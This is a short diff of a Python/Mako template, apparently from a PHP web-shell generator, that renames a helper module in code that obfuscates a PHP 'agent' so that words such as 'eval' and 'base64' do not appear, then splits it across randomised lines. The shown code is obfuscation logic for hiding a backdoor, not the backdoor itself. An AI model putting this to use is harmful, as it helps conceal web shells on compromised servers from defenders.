@@ -1,22 +1,22 @@
 <?php<%!
 import random
 import itertools
-from core import utilities
 import string
 import re
 import pipes
+import tool
 %><%
 
 # Does not include \ to avoid escaping termination quotes
 def find_substr_not_in_str(str, characters = string.letters + string.digits + '!"#$%&()*+,-./:;<=>?@[]^_`{|}~'):
 	while True:
-		substr = utilities.randstr(2, False, characters)
+		substr = tool.strings.randstr(2, False, characters)
 		if not substr in str:
 			return substr
 
 def obfuscate(str, obf, division, dangerous):
 	while True:
-		polluted = obf.join(list(utilities.divide(str, 0, division, len(str)/division)))
+		polluted = obf.join(list(tool.strings.divide(str, 0, division, len(str)/division)))
 
 		found = False
 		for dang in dangerous:
@@ -34,7 +34,7 @@ obfuscated_agent = obfuscate(agent_minified, obfuscation_agent, 6, ('eval', 'bas
 
 agent_splitted_line_number = random.randint(10,14)
 
-agent_splitted = list(utilities.divide(obfuscated_agent, len(obfuscated_agent)/agent_splitted_line_number-random.randint(0,5), len(obfuscated_agent)/agent_splitted_line_number, agent_splitted_line_number))
+agent_splitted = list(tool.strings.divide(obfuscated_agent, len(obfuscated_agent)/agent_splitted_line_number-random.randint(0,5), len(obfuscated_agent)/agent_splitted_line_number, agent_splitted_line_number))
 
 agent_variables = list(string.letters[:])
 random.shuffle(agent_variables)
